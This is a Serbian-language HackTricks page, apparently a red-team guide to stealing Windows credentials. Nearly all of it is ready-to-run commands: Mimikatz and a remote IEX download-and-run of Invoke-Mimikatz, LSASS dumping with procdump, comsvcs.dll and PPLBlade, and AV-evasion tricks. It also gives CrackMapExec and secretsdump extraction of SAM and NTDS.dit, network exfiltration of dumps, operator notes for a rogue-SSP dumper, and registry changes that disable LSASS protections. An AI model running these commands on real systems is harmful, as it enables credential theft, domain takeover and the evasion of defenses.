# Krađa Windows kredencijala

{{#include ../../banners/hacktricks-training.md}}

## Kredencijali — Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pronađite druge stvari koje Mimikatz može da uradi na** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Saznajte više o nekim mogućim credentials zaštitama ovde.**](credentials-protections.md) **Ove zaštite mogu sprečiti Mimikatz da izvuče neke credentials.**

## Credentials sa Meterpreterom

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam napravio da **pretražite passwords and hashes** na sistemu žrtve.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Zaobilaženje AV

### Procdump + Mimikatz

Pošto **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**je legitiman Microsoft alat**, on nije detektovan od strane Defender-a.\
Možete koristiti ovaj alat da **dump the lsass process**, **download the dump** i **extract** the **credentials locally** iz dump-a.

Takođe možete koristiti [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ovaj proces se automatski izvršava pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** mogu da označe kao **maliciozno** korišćenje **procdump.exe to dump lsass.exe**, to je zato što detektuju stringove **"procdump.exe" i "lsass.exe"**. Zato je **diskretnije** proslediti kao **argument** **PID** od lsass.exe procdump-u **umesto** imena **lsass.exe.**

### Dumping lsass with **comsvcs.dll**

DLL pod imenom **comsvcs.dll** koji se nalazi u `C:\Windows\System32` je odgovoran za **dumping process memory** u slučaju pada. Ovaj DLL sadrži **funkciju** pod imenom **`MiniDumpW`**, namenjenu da se pozove pomoću `rundll32.exe`.\
Nije bitno šta su prva dva argumenta, ali treći je podeljen na tri komponente. Process ID koji treba da se dump-uje predstavlja prvu komponentu, lokacija dump fajla predstavlja drugu, a treća komponenta je striktno reč **full**. Ne postoje alternativne opcije.\
Nakon parsiranja ovih triju komponenti, DLL kreira dump fajl i prebacuje memoriju navedenog procesa u taj fajl.\
Korišćenje **comsvcs.dll** je moguće za dumpovanje lsass procesa, čime se eliminiše potreba za upload-ovanjem i izvršavanjem procdump. Ova metoda je detaljno opisana na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

Sledeća komanda se koristi za izvršenje:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Možete automatizovati ovaj proces pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumpovanje lsass-a pomoću Task Manager-a**

1. Kliknite desnim tasterom miša na Task Bar i izaberite Task Manager
2. Kliknite na More details
3. Potražite proces "Local Security Authority Process" u Processes tab
4. Kliknite desnim tasterom miša na proces "Local Security Authority Process" i kliknite na "Create dump file".

### Dumpovanje lsass-a pomoću procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je Microsoft potpisani binarni fajl koji je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass uz PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je Protected Process Dumper Tool koji omogućava obfuskaciju memory dump fajlova i prenos na udaljene radne stanice bez smeštanja na disk.

**Ključne funkcionalnosti**:

1. Zaobilaženje PPL zaštite
2. Obfuskacija memory dump fajlova kako bi se izbegli Defender mehanizmi detekcije zasnovani na potpisima
3. Upload-ovanje memory dump-a pomoću RAW i SMB metoda bez zapisivanja na disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-bazirano LSASS dumpovanje without MiniDumpWriteDump

Ink Dragon isporučuje trometodni dumper nazvan **LalsDumper** koji nikada ne poziva `MiniDumpWriteDump`, pa EDR hook-ovi na taj API nikada ne aktiviraju:

1. **Stage 1 loader (`lals.exe`)** – pretražuje `fdp.dll` tražeći placeholder koji se sastoji od 32 mala slova `d`, prepisuje ga apsolutnom putanjom do `rtu.txt`, snima patčovan DLL kao `nfdp.dll` i poziva `AddSecurityPackageA("nfdp","fdp")`. To primorava **LSASS** da učita maliciozni DLL kao novi Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – kada LSASS učita `nfdp.dll`, DLL čita `rtu.txt`, XOR-uje svaki bajt sa `0x20` i mapira dekodirani blob u memoriju pre prebacivanja izvršavanja.
3. **Stage 3 dumper** – mapirani payload ponovo implementira MiniDump logiku koristeći **direct syscalls** rešene iz hashed API imena (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Poseban export nazvan `Tom` otvara `%TEMP%\<pid>.ddt`, strimuje kompresovan LSASS dump u fajl i zatvara handle tako da eksfiltracija može da se izvrši kasnije.

Operator notes:

* Držite `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` u istom direktorijumu. Stage 1 prepisuje hardkodovani placeholder apsolutnom putanjom do `rtu.txt`, pa njihovo razdvajanje prekida lanac.
* Registracija se obavlja dodavanjem `nfdp` u `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Možete sami postaviti tu vrednost da bi LSASS ponovo učitavao SSP pri svakom bootu.
* Fajlovi `%TEMP%\*.ddt` su kompresovani dumpovi. Dekompresujte lokalno, pa ih prosledite Mimikatz/Volatility za ekstrakciju kredencijala.
* Pokretanje `lals.exe` zahteva admin/SeTcb prava da bi `AddSecurityPackageA` uspeo; kad poziv završi, LSASS transparentno učita rogue SSP i izvršava Stage 2.
* Uklanjanje DLL-a sa diska ga ne izbaci iz LSASS-a. Ili obrišite registry unos i restartujte LSASS (reboot) ili ga ostavite za dugoročnu persistenciju.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Izdvoji NTDS.dit sa ciljanog DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump the NTDS.dit password history sa ciljanog DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Prikaži atribut pwdLastSet za svaki nalog iz NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Krađa SAM & SYSTEM

Ove datoteke bi trebalo da se **nalaze** u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM_. Ali **ne možete ih jednostavno kopirati na uobičajen način** jer su zaštićene.

### Iz registra

Najlakši način da ukradete te datoteke je da dobijete kopiju iz registra:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Preuzmite** te datoteke na svoju Kali mašinu i **izvucite hashes** koristeći:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Možete napraviti kopiju zaštićenih fajlova koristeći ovu uslugu. Potrebno je da budete Administrator.

#### Using vssadmin

vssadmin binary je dostupan samo u verzijama Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ali isto možete uraditi iz **Powershell**. Ovo je primer **kako kopirati SAM file** (hard disk koji se koristi je "C:" i sačuvan je u C:\users\Public), ali ovo možete koristiti za kopiranje bilo kog zaštićenog fajla:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Na kraju, možete takođe koristiti [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Fajl **NTDS.dit** je poznat kao srce **Active Directory**, i sadrži ključne podatke o objektima korisnika, grupama i njihovim članstvima. Tu se čuvaju **password hashes** za domain korisnike. Ovaj fajl je baza podataka Extensible Storage Engine (ESE) i nalazi se na _%SystemRoom%/NTDS/ntds.dit_.

U ovoj bazi postoje tri glavne tabele:

- **Data Table**: Ova tabela služi za čuvanje detalja o objektima kao što su korisnici i grupe.
- **Link Table**: Prati odnose, kao što su članstva u grupama.
- **SD Table**: Ovde se nalaze **Security descriptors** za svaki objekat, obezbeđujući bezbednost i kontrolu pristupa za sačuvane objekte.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows koristi _Ntdsa.dll_ za interakciju sa tim fajlom i on je korišćen od strane _lsass.exe_. Zbog toga, deo fajla **NTDS.dit** može biti smešten **inside the `lsass`** memoriju (možeš pronaći najrecentnije pristupljene podatke verovatno zbog poboljšanja performansi korišćenjem **cache**).

#### Dekripcija heševa unutar NTDS.dit

Hash je šifrovan 3 puta:

1. Dekriptiraj Password Encryption Key (**PEK**) koristeći **BOOTKEY** i **RC4**.
2. Dekriptiraj hash koristeći **PEK** i **RC4**.
3. Dekriptiraj hash koristeći **DES**.

**PEK** ima istu vrednost na svakom domain controller-u, ali je šifrovan unutar fajla **NTDS.dit** koristeći **BOOTKEY** iz **SYSTEM** fajla domain controller-a (različit je između domain controller-a). Zato, da bi dobio credentials iz NTDS.dit fajla potrebno ti je fajlovi NTDS.dit i SYSTEM (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Takođe možete koristiti [**volume shadow copy**](#stealing-sam-and-system) trik da kopirate fajl **ntds.dit**. Imajte na umu da će vam takođe trebati kopija fajla **SYSTEM** (ponovo, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).

### **Ekstraktovanje hashes iz NTDS.dit**

Kada ste **nabavili** fajlove **NTDS.dit** i **SYSTEM**, možete koristiti alate kao što je _secretsdump.py_ da biste **izvukli hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Takođe ih možete **automatski izdvojiti** koristeći valid domain admin user:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Za **velike NTDS.dit datoteke** preporučuje se da ih izdvojite koristeći [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na kraju, možete takođe koristiti **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Izdvajanje objekata domena iz NTDS.dit u SQLite bazu podataka**

NTDS objekti se mogu izvesti u SQLite bazu podataka pomoću [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ne izdvajaju se samo secrets već i kompletni objekti i njihovi atributi za dalju ekstrakciju informacija kada je raw NTDS.dit file već pribavljen.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive je opciona, ali omogućava dešifrovanje tajni (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Pored ostalih informacija, ekstrahuju se sledeći podaci: korisnički i mašinski nalozi sa njihovim hashovima, UAC flags, timestamp poslednjeg logona i promene lozinke, opis naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizacionih jedinica i članstvo, trusted domains sa tipom trusts, smerom i atributima...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Možete koristiti ovaj binary za ekstrakciju credentials iz više softvera.
```
lazagne.exe all
```
## Ostali alati za izvlačenje credentials iz SAM i LSASS

### Windows credentials Editor (WCE)

Ovaj alat se može koristiti za izvlačenje credentials iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Izvlači credentials iz SAM fajla
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Ekstrahuje kredencijale iz SAM fajla
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Preuzmite ga sa: [http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i samo ga **pokrenite** — lozinke će biti ekstrahovane.

## Iskopavanje neaktivnih RDP sesija i slabljenje sigurnosnih kontrola

Ink Dragon’s FinalDraft RAT uključuje `DumpRDPHistory` tasker čije su tehnike korisne za svakog red-teamera:

### DumpRDPHistory-style prikupljanje telemetrije

* **Outbound RDP targets** – parsirajte svaki korisnički hive na `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Svaki podključ čuva ime servera, `UsernameHint`, i timestamp poslednjeg upisa. Možete replicirati FinalDraft-ovu logiku sa PowerShell-om:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – pretražite log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` za Event IDs **21** (successful logon) i **25** (disconnect) da mapirate ko je administrirao mašinu:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Kada znate koji Domain Admin redovno pristupa, napravite dump LSASS-a (pomoću LalsDumper/Mimikatz) dok im **disconnected** sesija još postoji. CredSSP + NTLM fallback ostavlja njihov verifier i tokene u LSASS-u, koje se zatim mogu replay-ovati preko SMB/WinRM da se pribavi `NTDS.dit` ili uspostavi persistencija na domain controller-ima.

### Registry downgrades koje cilja FinalDraft

Isti implant takođe menja nekoliko registry ključeva kako bi olakšao krađu kredencijala:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Podešavanje `DisableRestrictedAdmin=1` prisiljava potpunu credential/ticket reuse tokom RDP-a, omogućavajući pass-the-hash style pivots.
* `LocalAccountTokenFilterPolicy=1` onemogućava UAC token filtering tako da lokalni admini dobijaju unrestricted tokens preko mreže.
* `DSRMAdminLogonBehavior=2` dozvoljava DSRM administratoru da se prijavi dok je DC online, dajući napadačima još jedan built-in high-privilege account.
* `RunAsPPL=0` uklanja LSASS PPL protections, čineći pristup memoriji trivijalnim za dumpers kao što je LalsDumper.

## Reference

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
